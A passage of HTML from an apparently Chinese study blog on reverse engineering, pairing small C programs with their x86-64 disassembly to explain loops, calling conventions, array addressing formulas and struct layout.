//a=0</span><br><span class="hljs-comment">.text:000000000040156B                 mov     [rbp+var_8], 0  //b=0</span><br><span class="hljs-comment">.text:0000000000401572                 mov     [rbp+var_8], 0</span><br><span class="hljs-comment">.text:0000000000401579                 jmp     short loc_401596</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">.text:000000000040157B ; ---------------------------------------------------------------------------</span><br><span class="hljs-comment">.text:000000000040157B</span><br><span class="hljs-comment"> */</span>  <br> <br>.text:<span class="hljs-number">000000000040157B</span> loc_40157B:                             ; CODE XREF: main+<span class="hljs-number">4</span>A↓j<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=a</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, eax  <span class="hljs-comment">//edx=a</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401587</span>                 call    <span class="hljs-built_in">printf</span>   <span class="hljs-comment">//输出a</span><br>.text:<span class="hljs-number">000000000040158</span>C                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">000000000040158F</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a+=b   </span><br>.text:<span class="hljs-number">0000000000401592</span>                 add     [rbp+var_8], <span class="hljs-number">1</span> <span class="hljs-comment">//b+=1  步长</span><br>.text:<span class="hljs-number">0000000000401596</span><br>.text:<span class="hljs-number">0000000000401596</span> loc_401596:                             ; CODE XREF: main+<span class="hljs-number">29</span>↑j<br>    <span class="hljs-comment">//比较</span><br>.text:<span class="hljs-number">0000000000401596</span>                 cmp     [rbp+var_8], <span class="hljs-number">63</span>h ; <span class="hljs-string">&#x27;c&#x27;</span>  <span class="hljs-comment">//99</span><br>.text:<span class="hljs-number">000000000040159</span>A                 jle     <span class="hljs-keyword">short</span> loc_40157B   <span class="hljs-comment">// </span><br>.text:<span class="hljs-number">000000000040159</span>C                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">000000000040159F</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>A3                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>A4                 retn<br>.text:<span class="hljs-number">00000000004015</span>A4 main            endp<br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="三种调用方式"><a href="#三种调用方式" class="headerlink" title="三种调用方式"></a>三种调用方式</h3><h4 id="cdel-调用方平衡堆栈"><a href="#cdel-调用方平衡堆栈" class="headerlink" title="__cdel 调用方平衡堆栈"></a>__cdel 调用方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：可以用于可变参数函数（因为可变参数情况下，我传几个参数我是知道的，自己 传自己删<br>缺点：增加了代码长度，调用几次子函数，就要多几次栈平衡操作</p><p>解释：这里main函数对add产生调用，main属于调用方，所以在main函数这里平衡堆栈</p><p>即 在 call 子函数 之后 add 开辟空间</p><h4 id="stdcall-被调方平衡堆栈"><a href="#stdcall-被调方平衡堆栈" class="headerlink" title="__stdcall 被调方平衡堆栈"></a>__stdcall 被调方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">__int64 __stdcall <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">float</span> a,<span class="hljs-keyword">double</span> b,<span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b + c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3.0f</span>,<span class="hljs-number">4.0f</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：节省代码长度 缺点：不支持可变参数（因为子函数是可重复使用的代码块，这段代码块一定是死的，<br>是不能再改变的，所以如果希望子函数平衡栈，那么它的参数个数必须确定）</p><p>解释：这里main函数对add产生调用，add函数属于被调用方，所以在add函数这里平衡堆栈</p><p>即 在 call 子函数 之前 add 开辟空间</p><h4 id="fastcall-stdcallfast版"><a href="#fastcall-stdcallfast版" class="headerlink" title="__fastcall stdcallfast版"></a>__fastcall stdcallfast版</h4><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>​    特征：连续几次赋值类型相同，且赋值的目的地址是从低到高的。 而连续定义的局部变量其赋值地址是从高到低的。 而全局数组和静态数组看上去就和连续定义同类项变量没有区别<br>​    字符串：是以’\0’结尾的char数组</p><p>​    字符串赋初值时，不是一个char一个char复制的，而是优先4字节，再2字节，最后1字节 （4-2-1）<br>​    作为参数传递：数组作为参数传递会退化为指针，因此数组参数实际上是指针，此时不能使用 sizeof获取其长度<br>​    作为返回值：禁止！局部数组的生命周期在函数返回时就结束了，因此返回的内容将不确定 可以使用全局数组、静态数组、作为参数传入的数组 静态数组作为一个整体，只占一个代表初始化的标志位（好像 多维数组的存储方式：展成一维（多维数组是C语言概念，不是汇编的概念） 转成汇编后，常量下标和一维情况完全没有区别，如[ebp+1C];<br>​    数组寻址方式 数组名和指针的区别：指针访问元素的效率比数组名要低：原因是指针是个变量，使用时要 先访问这个变量的内容（数组的首地址），再偏移（两次寻址）；而数组名自身就是常值， 直接偏移即可（一次寻址） 一维数组下：<br>​    下标是常量：编译直接计算出地址 下标是变量：先取变量，再计算偏移 下标是表达式：看复杂程度，其余同上<br>​    二维数组：<br>​        两维都是常量：编辑直接计算出地址 有一维是常量：取一次变量，之后直接计算地址<br>​        两维都是变量：取第一个变量，计算出第二维的首地址；取第二个变量，结合计算出的 首地址，求出该元素的偏移<br>​    多维数组：类推</p><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;i);<br><br>    Ary[i] = <span class="hljs-number">3</span>;  <span class="hljs-comment">//这句话会产生数组寻址公式</span><br>    <span class="hljs-keyword">return</span> Ary[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_10          = dword ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_C           = dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_C], <span class="hljs-number">0</span>  <span class="hljs-comment">//a[0]=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">1</span>  <span class="hljs-comment">//a[1]=1</span><br>.text:<span class="hljs-number">0000000000401572</span>                 mov     [rbp+var_4], <span class="hljs-number">2</span>  <span class="hljs-comment">//a[2]=2</span><br>.text:<span class="hljs-number">0000000000401579</span>                 mov     [rbp+var_10], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rax, [rbp+var_10] <br>.text:<span class="hljs-number">0000000000401584</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401587</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span> <span class="hljs-comment">//scanf(&quot;&quot;);</span><br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">0000000000401593</span>                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">0000000000401596</span>                 cdqe<br>.text:<span class="hljs-number">0000000000401598</span>                 mov     [rbp+rax*<span class="hljs-number">4</span>+var_C], <span class="hljs-number">3</span> <span class="hljs-comment">//a[]</span><br>.text:<span class="hljs-number">00000000004015</span>A0                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">00000000004015</span>A3                 cdqe<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     eax, [rbp+rax*<span class="hljs-number">4</span>+var_C]<br>.text:<span class="hljs-number">00000000004015</span>A9                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>AD                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>AE                 retn<br>.text:<span class="hljs-number">00000000004015</span>AE main            endp<br></code></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;k);<br><br>    Ary[i][j][k] = <span class="hljs-number">9</span>;  <span class="hljs-comment">//会产生数组寻址公式</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_7C          = dword ptr <span class="hljs-number">-7</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_78          = dword ptr <span class="hljs-number">-78</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_74          = dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_70          = dword ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000401552</span>                 sub     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">0000000000401559</span>                 lea     rbp, [rsp+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">0000000000401561</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_0], ecx<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_8], rdx<br>.text:<span class="hljs-number">0000000000401568</span>                 call    __main<br>.text:<span class="hljs-number">000000000040156</span>D                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_70] <br>.text:<span class="hljs-number">0000000000401571</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401576</span>                 mov     ecx, <span class="hljs-number">0</span>Ch<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     rdi, rdx<br>.text:<span class="hljs-number">000000000040157</span>E                 rep stosq<br>.text:<span class="hljs-number">0000000000401581</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_74], <span class="hljs-number">0</span>  <br>.text:<span class="hljs-number">0000000000401588</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_78], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040158F</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_7C], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401596</span>                 lea     rcx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">000000000040159</span>A                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">000000000040159</span>E                 lea     rax, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015</span>A2                 mov     r9, rcx<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     r8, rdx<br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     rdx, rax<br>.text:<span class="hljs-number">00000000004015</span>AB                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d%d%d&quot;</span>  <span class="hljs-comment">//读取三维数组</span><br>.text:<span class="hljs-number">00000000004015B</span>2                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">00000000004015B</span>7                 mov     edx, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015B</span>A                 mov     eax, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">00000000004015B</span>D                 mov     ecx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">00000000004015</span>C0                 movsxd  rcx, ecx<br>.text:<span class="hljs-number">00000000004015</span>C3                 movsxd  rdx, edx<br>.text:<span class="hljs-number">00000000004015</span>C6                 movsxd  r8, eax<br>.text:<span class="hljs-number">00000000004015</span>C9                 mov     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>CC                 add     rax, rax<br>.text:<span class="hljs-number">00000000004015</span>CF                 add     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>D2                 add     rax, r8<br>.text:<span class="hljs-number">00000000004015</span>D5                 shl     rax, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>D9                 add     rax, rcx<br>.text:<span class="hljs-number">00000000004015</span>DC                 mov     [rbp+rax*<span class="hljs-number">4</span>+<span class="hljs-number">20</span>h+var_70], <span class="hljs-number">9</span><br>.text:<span class="hljs-number">00000000004015E4</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015E9</span>                 add     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">00000000004015F</span>0                 pop     rdi<br>.text:<span class="hljs-number">00000000004015F</span>1                 pop     rbp<br>.text:<span class="hljs-number">00000000004015F</span>2                 retn<br>.text:<span class="hljs-number">00000000004015F</span>2 main            endp<br></code></pre></td></tr></table></figure><p>公式先贴出来:</p><p>　　<strong>Ary + sizeof(type[C][H]) * i + sizeof(type[H])*j + sizeof(type)*k</strong></p><p> 代入公式看汇编</p><p>　　1.eax = i的值</p><p>  　　2. eax * 30 ,相当于求 sizeof(type[C][H]) * i</p><p>　　3.求出数组首地址+eax,也就是求出了 Ary[M]的位置,给Ecx赋值</p><p>　　4.求出j的值</p><p>　　5.左移4位,相当于2^4次方也就是16 这一步相当于求 sizeof(type[H])的值</p><p>　　6.ary[M] + sizeof(type[H])的值得出了 ary[M][C]的值</p><p>　　7.求出k的值</p><p>　　8.数组寻址公式 ary[M][C]的值 + 4 * k的值.</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> ch;<br>    <span class="hljs-keyword">int</span>  number1;<br>    <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> number2;<br>    <span class="hljs-keyword">double</span> dbl;<br>    <span class="hljs-keyword">float</span> flt;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span> <span class="hljs-title">t1</span>=</span>&#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3.14</span>,<br>    <span class="hljs-number">0.0</span>    <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-keyword">sizeof</span>(t1));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: __tmainCRTStartup+242↑p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                                         <span class="hljs-comment">; DATA XREF: .pdata:000000000040506C↓o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_20          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">20h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_1C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">1Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_18          = <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_10          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_8           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401551</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401554</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401558</span>                 <span class="hljs-keyword">call</span>    __main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040155D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-number">61h</span> <span class="hljs-comment">; &#x27;a&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401561</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_1C], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401568</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_18], <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>000000000040156E                 <span class="hljs-keyword">movsd</span>   <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:qword_404008<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401576</span>                 <span class="hljs-keyword">movsd</span>   [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157B                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157F                 <span class="hljs-keyword">movss</span>   [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401584</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">20h</span> <span class="hljs-comment">; &#x27; &#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401589</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, Format     <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401590</span>                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401595</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040159A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span 